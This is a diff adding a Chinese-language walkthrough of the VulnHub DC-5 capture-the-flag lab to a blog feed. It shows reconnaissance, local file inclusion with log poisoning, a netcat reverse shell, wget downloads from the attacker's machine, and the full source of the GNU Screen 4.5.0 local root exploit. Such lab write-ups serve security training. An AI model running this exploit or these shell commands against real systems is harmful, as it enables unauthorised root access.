@@ -26,6 +26,10 @@
 <h3 id="2-爆破密码"><a href="#2-爆破密码" class="headerlink" title="2.爆破密码"></a>2.爆破密码</h3><img src="/2020/08/23/DC-4/image-20200823100752772.png" class>
 
 <p><code>添加字典</code></p>
+<blockquote>
+<p>字典为：</p>
+<p>/usr/share/john/password.lst</p>
+</blockquote>
 <img src="/2020/08/23/DC-4/image-20200823100842693.png" class>
 
 <p><code>添加线程数</code></p>
@@ -97,6 +101,136 @@
 
 <p><code>登入</code></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">charles@dc-4:~$ su fjy</span><br><span class="line">root@dc-4:/home/charles<span class="comment"># cd</span></span><br><span class="line">root@dc-4:/root<span class="comment"># ls</span></span><br><span class="line">flag.txt</span><br><span class="line">root@dc-4:/root<span class="comment"># cat flag.txt </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">888       888          888 888      8888888b.                             888 888 888 888 </span><br><span class="line">888   o   888          888 888      888  <span class="string">&quot;Y88b                            888 888 888 888 </span></span><br><span class="line"><span class="string">888  d8b  888          888 888      888    888                            888 888 888 888 </span></span><br><span class="line"><span class="string">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 </span></span><br><span class="line"><span class="string">888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;</span><span class="string">&quot;88b 888 &quot;</span>88b d8P  Y8b 888 888 888 888 </span><br><span class="line">88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P </span><br><span class="line">8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      <span class="string">&quot;   &quot;</span>   <span class="string">&quot;   &quot;</span>  </span><br><span class="line">888P     Y888  <span class="string">&quot;Y8888  888 888      8888888P&quot;</span>   <span class="string">&quot;Y88P&quot;</span>  888  888  <span class="string">&quot;Y8888  888 888 888 888 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulations!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those</span></span><br><span class="line"><span class="string">who have provided feedback, and who have taken time to complete these little</span></span><br><span class="line"><span class="string">challenges.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">If you enjoyed this CTF, send me a tweet via @DCAU7.</span></span><br><span class="line"><span class="string">root@dc-4:/root# </span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>vulnhub</category>
+      </categories>
+      <tags>
+        <tag>靶机</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DC-5</title>
+    <url>/2020/08/24/DC-5/</url>
+    <content><![CDATA[<h2 id="0x00-官网描述"><a href="#0x00-官网描述" class="headerlink" title="0x00.官网描述"></a>0x00.官网描述</h2><blockquote>
+<p>DC-5 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</p>
+<p>The plan was for DC-5 to kick it up a notch, so this might not be great for beginners, but should be ok for people with intermediate or better experience. Time will tell (as will feedback).</p>
+<p>As far as I am aware, there is only one exploitable entry point to get in (there is no SSH either). This particular entry point may be quite hard to identify, but it is there. You need to look for something a little out of the ordinary (something that changes with a refresh of a page). This will hopefully provide some kind of idea as to what the vulnerability might involve.</p>
+<p>And just for the record, there is no phpmailer exploit involved. :-)</p>
+<p>The ultimate goal of this challenge is to get root and to read the one and only flag.</p>
+<p>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</p>
+<p>For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won’t give you the answer, instead, I’ll give you an idea about how to move forward.</p>
+<p>But if you’re really, really stuck, you can watch this video which shows the first step.</p>
+</blockquote>
+<a id="more"></a>
+
+<h2 id="0x01-老规矩上nmap"><a href="#0x01-老规矩上nmap" class="headerlink" title="0x01.老规矩上nmap"></a>0x01.老规矩上nmap</h2><p><code>可以发现1为网关，2为宿主机，6为kali，那么4就是我们的受害者</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC5<span class="comment"># nmap -sP 192.168.1.0/24 -oN nmap.sP</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-23 23:17 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.1</span><br><span class="line">Host is up (0.0018s latency).</span><br><span class="line">MAC Address: 68:D1:BA:1F:FD:48 (Shenzhen Youhua Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.2</span><br><span class="line">Host is up (0.00077s latency).</span><br><span class="line">MAC Address: 50:5B:C2:8C:BE:A5 (Liteon Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.4</span><br><span class="line">Host is up (0.00052s latency).</span><br><span class="line">MAC Address: 00:0C:29:30:2B:A9 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.6</span><br><span class="line">Host is up.</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="keyword">in</span> 2.05 seconds</span><br><span class="line">root@JIYE:~/tmp/DC5<span class="comment"># </span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-继续nmap扫描服务及端口"><a href="#0x02-继续nmap扫描服务及端口" class="headerlink" title="0x02.继续nmap扫描服务及端口"></a>0x02.继续nmap扫描服务及端口</h2><p><code>发现开放了80/111/40039端口</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC5<span class="comment"># nmap -A 192.168.1.4 -p- -oN nmap.A</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-23 23:20 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.4</span><br><span class="line">Host is up (0.00047s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">80/tcp    open  http    nginx 1.6.2</span><br><span class="line">|_http-server-header: nginx/1.6.2</span><br><span class="line">|_http-title: Welcome</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100024  1          40039/tcp   status</span><br><span class="line">|   100024  1          44947/tcp6  status</span><br><span class="line">|   100024  1          46754/udp   status</span><br><span class="line">|_  100024  1          51314/udp6  status</span><br><span class="line">40039/tcp open  status  1 (RPC <span class="comment">#100024)</span></span><br><span class="line">MAC Address: 00:0C:29:30:2B:A9 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.47 ms 192.168.1.4</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 14.58 seconds</span><br><span class="line">root@JIYE:~/tmp/DC5<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-访问80端口"><a href="#0x03-访问80端口" class="headerlink" title="0x03.访问80端口"></a>0x03.访问80端口</h2><h3 id="1-发现前四个都为静态页面，只有contact有提交面板"><a href="#1-发现前四个都为静态页面，只有contact有提交面板" class="headerlink" title="1.发现前四个都为静态页面，只有contact有提交面板"></a>1.发现前四个都为静态页面，只有contact有提交面板</h3><img src="/2020/08/24/DC-5/image-20200824113750326.png" class>
+
+<h3 id="2-提交数据"><a href="#2-提交数据" class="headerlink" title="2.提交数据"></a>2.提交数据</h3><p><code>发现为url传参</code></p>
+<img src="/2020/08/24/DC-5/image-20200824114238685.png" class>
+
+<p><code>去掉参数再次访问，发现每次刷新copyright有变化</code></p>
+<img src="/2020/08/24/DC-5/image-20200824114357269.png" class>
+
+<h3 id="3-使用bp爆破根目录php文件"><a href="#3-使用bp爆破根目录php文件" class="headerlink" title="3.使用bp爆破根目录php文件"></a>3.使用bp爆破根目录php文件</h3><blockquote>
+<p>字典为：</p>
+<p>/usr/share/dirb/wordlists/big.txt</p>
+</blockquote>
+<img src="/2020/08/24/DC-5/image-20200824121351077.png" class>
+
+<p><code>爆破完成，发现多出一个footer</code></p>
+<img src="/2020/08/24/DC-5/image-20200824121440845.png" class>
+
+<p><code>访问footer，发现为copyright，且每次刷新都变化，可以判断为存在文件包含</code></p>
+<img src="/2020/08/24/DC-5/image-20200824121734811.png" class>
+
+<img src="/2020/08/24/DC-5/image-20200824122004107.png" class>
+
+<h2 id="0x04-爆破包含变量"><a href="#0x04-爆破包含变量" class="headerlink" title="0x04.爆破包含变量"></a>0x04.爆破包含变量</h2><p><code>发现file可能为变量</code></p>
+<blockquote>
+<p>字典为</p>
+<p>/usr/share/wordlists/dirb/common.txt</p>
+<p>/usr/share/wfuzz/wordlist/vulns/dirTraversal-nix.txt</p>
+</blockquote>
+<img src="/2020/08/24/DC-5/image-20200824131915542.png" class>
+
+<img src="/2020/08/24/DC-5/image-20200824131944199.png" class>
+
+<img src="/2020/08/24/DC-5/image-20200824132835565.png" class>
+
+<p><code>进行测试，得出file就是变量</code></p>
+<img src="/2020/08/24/DC-5/image-20200824133133495.png" class>
+
+<h2 id="0x05-尝试远程文件包含"><a href="#0x05-尝试远程文件包含" class="headerlink" title="0x05.尝试远程文件包含"></a>0x05.尝试远程文件包含</h2><p><code>结果发现不存在远程文件包含</code></p>
+<img src="/2020/08/24/DC-5/image-20200824134347907.png" class>
+
+<img src="/2020/08/24/DC-5/image-20200824134406453.png" class>
+
+<h2 id="0x06-本地包含"><a href="#0x06-本地包含" class="headerlink" title="0x06.本地包含"></a>0x06.本地包含</h2><p><code>由于不能上传文件，所以包含web日志文件</code></p>
+<p><code>由于是nginx/1.6.2，可以使用爆破日志文件</code></p>
+<p><code>这里直接百度找到了日志文件常见的目录，本次实验目录为/var/log/nginx/access.log</code></p>
+<img src="/2020/08/24/DC-5/image-20200824150446363.png" class>
+
+<p><code>bp写入小马</code></p>
+<img src="/2020/08/24/DC-5/image-20200824150830757.png" class>
+
+<p><code>上传成功</code></p>
+<img src="/2020/08/24/DC-5/image-20200824150900768.png" class>
+
+<h2 id="0x07-蚁剑连接shell"><a href="#0x07-蚁剑连接shell" class="headerlink" title="0x07.蚁剑连接shell"></a>0x07.蚁剑连接shell</h2><img src="/2020/08/24/DC-5/image-20200824151103230.png" class>
+
+<h2 id="0x08-蚁剑建立稳定的shell"><a href="#0x08-蚁剑建立稳定的shell" class="headerlink" title="0x08.蚁剑建立稳定的shell"></a>0x08.蚁剑建立稳定的shell</h2><p><code>由于日志文件存在读写，所以在/tmp下创建稳定小马进行连接</code></p>
+<p><code>此处404用于欺骗</code></p>
+<img src="/2020/08/24/DC-5/image-20200824151445724.png" class>
+
+<p><code>访问</code></p>
+<img src="/2020/08/24/DC-5/image-20200824151541645.png" class>
+
+<p><code>连接</code></p>
+<img src="/2020/08/24/DC-5/image-20200824151632387.png" class>
+
+<h2 id="0x08-反弹shell给kali"><a href="#0x08-反弹shell给kali" class="headerlink" title="0x08.反弹shell给kali"></a>0x08.反弹shell给kali</h2><p><code>由于这里有nc，所以可以反弹shell</code></p>
+<img src="/2020/08/24/DC-5/image-20200824151959062.png" class>
+
+<p><code>建立连接</code></p>
+<img src="/2020/08/24/DC-5/image-20200824152332844.png" class>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [192.168.1.6] from (UNKNOWN) [192.168.1.4] 38471</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>
+
+<p><code>建立交互式shell</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>              </span><br><span class="line">www-data@dc-5:~/html$ </span><br><span class="line">www-data@dc-5:~/html$ </span><br><span class="line">www-data@dc-5:~/html$ whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">www-data@dc-5:~/html$ </span><br><span class="line">www-data@dc-5:~/html$ id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">www-data@dc-5:~/html$ <span class="built_in">cd</span> /</span><br><span class="line"><span class="built_in">cd</span> /</span><br><span class="line">www-data@dc-5:/$ </span><br></pre></td></tr></table></figure>
+
+<h2 id="0x09-提权"><a href="#0x09-提权" class="headerlink" title="0x09.提权"></a>0x09.提权</h2><h3 id="1-尝试sudo-l"><a href="#1-尝试sudo-l" class="headerlink" title="1.尝试sudo -l"></a>1.尝试sudo -l</h3><p><code>发现没有</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@dc-5:/$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">bash: sudo: <span class="built_in">command</span> not found</span><br><span class="line">www-data@dc-5:/$ </span><br></pre></td></tr></table></figure>
+
+<h3 id="2-查看SUID"><a href="#2-查看SUID" class="headerlink" title="2.查看SUID"></a>2.查看SUID</h3><p><code>发现screen-4.5.0具有SUID权限</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@dc-5:/$ find / -perm /4000 2&gt;dev/null</span><br><span class="line">find / -perm /4000 2&gt;dev/null</span><br><span class="line">/bin/su</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/screen-4.5.0</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/procmail</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/sbin/mount.nfs</span><br><span class="line">www-data@dc-5:/$ </span><br></pre></td></tr></table></figure>
+
+<h3 id="3-查看screen-4-5-0是否有漏洞"><a href="#3-查看screen-4-5-0是否有漏洞" class="headerlink" title="3.查看screen-4.5.0是否有漏洞"></a>3.查看screen-4.5.0是否有漏洞</h3><p><code>发现存在本地特权提升漏洞</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># searchsploit screen 4.5.0</span></span><br><span class="line">-------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                    |  Path</span><br><span class="line">-------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">GNU Screen 4.5.0 - Local Privilege Escalation                                                     | linux/<span class="built_in">local</span>/41154.sh</span><br><span class="line">GNU Screen 4.5.0 - Local Privilege Escalation (PoC)                                               | linux/<span class="built_in">local</span>/41152.txt</span><br><span class="line">-------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line">root@JIYE:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><code>上传文件</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment"># ls</span></span><br><span class="line">41154.sh</span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment"># cp 41154.sh /var/www/html/</span></span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment"># systemctl start apache2</span></span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@dc-5:/tmp<span class="variable">$wget</span> http://192.168.1.6/41154.sh</span><br><span class="line">converted <span class="string">&#x27;http://192.168.1.6/41154.sh&#x27;</span> (ANSI_X3.4-1968) -&gt; <span class="string">&#x27;http://192.168.1.6/41154.sh&#x27;</span> (UTF-8)</span><br><span class="line">--2020-08-25 00:57:32--  http://192.168.1.6/41154.sh</span><br><span class="line">Connecting to 192.168.1.6:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 1192 (1.2K) [text/x-sh]</span><br><span class="line">Saving to: <span class="string">&#x27;41154.sh&#x27;</span></span><br><span class="line"></span><br><span class="line">41154.sh            100%[=====================&gt;]   1.16K  --.-KB/s   <span class="keyword">in</span> 0s     </span><br><span class="line"></span><br><span class="line">2020-08-25 00:57:32 (350 MB/s) - <span class="string">&#x27;41154.sh&#x27;</span> saved [1192/1192]</span><br><span class="line"></span><br><span class="line">www-data@dc-5:/tmp$ ls</span><br><span class="line">ls</span><br><span class="line">41154.sh  demo.php</span><br><span class="line">www-data@dc-5:/tmp$</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-添加执行权限执行"><a href="#4-添加执行权限执行" class="headerlink" title="4.添加执行权限执行"></a>4.添加执行权限执行</h3><p><code>报错了。。。</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@dc-5:/tmp$ chmod +x 41154.sh</span><br><span class="line">chmod +x 41154.sh</span><br><span class="line">www-data@dc-5:/tmp$ ./41154.sh</span><br><span class="line">./41154.sh</span><br><span class="line">bash: ./41154.sh: /bin/bash^M: bad interpreter: No such file or directory</span><br><span class="line">www-data@dc-5:/tmp$ </span><br></pre></td></tr></table></figure>
+
+<p><code>查看文件，脚本是一个编译c</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment"># cat 41154.sh </span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># screenroot.sh</span></span><br><span class="line"><span class="comment"># setuid screen v4.5.0 local root exploit</span></span><br><span class="line"><span class="comment"># abuses ld.so.preload overwriting to get root.</span></span><br><span class="line"><span class="comment"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span></span><br><span class="line"><span class="comment"># HACK THE PLANET</span></span><br><span class="line"><span class="comment"># ~ infodox (25/1/2017) </span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;~ gnu/screenroot ~&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] First, we create our shell and library...&quot;</span></span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/libhax.c</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(<span class="string">&quot;/tmp/rootshell&quot;</span>, 0, 0);</span><br><span class="line">    chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, 04755);</span><br><span class="line">    unlink(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/rootshell.c</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, NULL, NULL);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line">rm -f /tmp/rootshell.c</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Triggering...&quot;</span></span><br><span class="line">screen -ls <span class="comment"># screen itself is setuid, so... </span></span><br><span class="line">/tmp/rootshellroot@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><code>下面进行本地编译</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment"># cat libhax.c</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(<span class="string">&quot;/tmp/rootshell&quot;</span>, 0, 0);</span><br><span class="line">    chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, 04755);</span><br><span class="line">    unlink(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment">#</span></span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment"># cat rootshell.c </span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, NULL, NULL);</span><br><span class="line">&#125;</span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment"># </span></span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment"># cat run.sh </span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Triggering...&quot;</span></span><br><span class="line">screen -ls <span class="comment"># screen itself is setuid, so... </span></span><br><span class="line">/tmp/rootshell</span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment">#</span></span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment"># gcc -fPIC -shared -ldl -o ./libhax.so ./libhax.c</span></span><br><span class="line">./libhax.c: In <span class="keyword">function</span> ‘dropshell’:</span><br><span class="line">./libhax.c:7:5: warning: implicit declaration of <span class="keyword">function</span> ‘chmod’ [-Wimplicit-function-declaration]</span><br><span class="line">    7 |     chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, 04755);</span><br><span class="line">      |     ^~~~~</span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment"># gcc -o ./rootshell ./rootshell.c</span></span><br><span class="line">./rootshell.c: In <span class="keyword">function</span> ‘main’:</span><br><span class="line">./rootshell.c:3:5: warning: implicit declaration of <span class="keyword">function</span> ‘setuid’ [-Wimplicit-function-declaration]</span><br><span class="line">    3 |     setuid(0);</span><br><span class="line">      |     ^~~~~~</span><br><span class="line">./rootshell.c:4:5: warning: implicit declaration of <span class="keyword">function</span> ‘setgid’ [-Wimplicit-function-declaration]</span><br><span class="line">    4 |     setgid(0);</span><br><span class="line">      |     ^~~~~~</span><br><span class="line">./rootshell.c:5:5: warning: implicit declaration of <span class="keyword">function</span> ‘seteuid’ [-Wimplicit-function-declaration]</span><br><span class="line">    5 |     seteuid(0);</span><br><span class="line">      |     ^~~~~~~</span><br><span class="line">./rootshell.c:6:5: warning: implicit declaration of <span class="keyword">function</span> ‘setegid’ [-Wimplicit-function-declaration]</span><br><span class="line">    6 |     setegid(0);</span><br><span class="line">      |     ^~~~~~~</span><br><span class="line">./rootshell.c:7:5: warning: implicit declaration of <span class="keyword">function</span> ‘execvp’ [-Wimplicit-function-declaration]</span><br><span class="line">    7 |     execvp(<span class="string">&quot;/bin/sh&quot;</span>, NULL, NULL);</span><br><span class="line">      |     ^~~~~~</span><br><span class="line">./rootshell.c:7:5: warning: too many arguments to built-in <span class="keyword">function</span> ‘execvp’ expecting 2 [-Wbuiltin-declaration-mismatch]</span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment">#</span></span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment"># ls</span></span><br><span class="line">41154.sh  libhax.c  libhax.so  rootshell  rootshell.c</span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-执行"><a href="#5-执行" class="headerlink" title="5.执行"></a>5.执行</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@dc-5:/tmp$ wget http://192.168.1.6/run.sh</span><br><span class="line">www-data@dc-5:/tmp$ wget http://192.168.1.6/rootshell</span><br><span class="line">www-data@dc-5:/tmp$ wget http://192.168.1.6/libhax.so</span><br><span class="line">www-data@dc-5:/tmp$ chmod +x run.sh</span><br><span class="line">chmod +x run.sh</span><br><span class="line">www-data@dc-5:/tmp$ ./run.sh</span><br><span class="line">./run.sh</span><br><span class="line">[+] Now we create our /etc/ld.so.preload file...</span><br><span class="line">[+] Triggering...</span><br><span class="line"><span class="string">&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span></span><br><span class="line"><span class="string">[+] done!</span></span><br><span class="line"><span class="string">No Sockets found in /tmp/screens/S-www-data.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># id</span></span><br><span class="line"><span class="string">id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span></span><br><span class="line"><span class="string"># whoami</span></span><br><span class="line"><span class="string">whoami</span></span><br><span class="line"><span class="string">root</span></span><br><span class="line"><span class="string"># ls</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">thisistheflag.txt</span></span><br><span class="line"><span class="string"># cat thisistheflag.txt</span></span><br><span class="line"><span class="string">cat /root/thisistheflag.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">888b    888 d8b                                                      888      888 888 888</span></span><br><span class="line"><span class="string">8888b   888 Y8P                                                      888      888 888 888</span></span><br><span class="line"><span class="string">88888b  888                                                          888      888 888 888</span></span><br><span class="line"><span class="string">888Y88b 888 888  .d8888b .d88b.       888  888  888  .d88b.  888d888 888  888 888 888 888</span></span><br><span class="line"><span class="string">888 Y88b888 888 d88P&quot;   d8P  Y8b      888  888  888 d88&quot;&quot;88b 888P&quot;   888 .88P 888 888 888</span></span><br><span class="line"><span class="string">888  Y88888 888 888     88888888      888  888  888 888  888 888     888888K  Y8P Y8P Y8P</span></span><br><span class="line"><span class="string">888   Y8888 888 Y88b.   Y8b.          Y88b 888 d88P Y88..88P 888     888 &quot;88b  &quot;   &quot;   &quot;</span></span><br><span class="line"><span class="string">888    Y888 888  &quot;Y8888P &quot;Y8888        &quot;Y8888888P&quot;   &quot;Y88P&quot;  888     888  888 888 888 888</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Once again, a big thanks to all those who do these little challenges,</span></span><br><span class="line"><span class="string">and especially all those who give me feedback - again, it&#x27;</span>s all greatly</span><br><span class="line">appreciated.  :-)</span><br><span class="line"></span><br><span class="line">I also want to send a big thanks to all those who find the vulnerabilities</span><br><span class="line">and create the exploits that make these challenges possible.</span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
@@ -286,7 +420,7 @@
       </tags>
   </entry>
   <entry>
-    <title>DC:2</title>
+    <title>DC-2</title>
     <url>/2020/08/21/DC-2/</url>
     <content><![CDATA[<h2 id="0x00-官网描述"><a href="#0x00-官网描述" class="headerlink" title="0x00.官网描述"></a>0x00.官网描述</h2><blockquote>
 <p>Much like DC-1, DC-2 is another purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.</p>
@@ -720,7 +854,7 @@
       </tags>
   </entry>
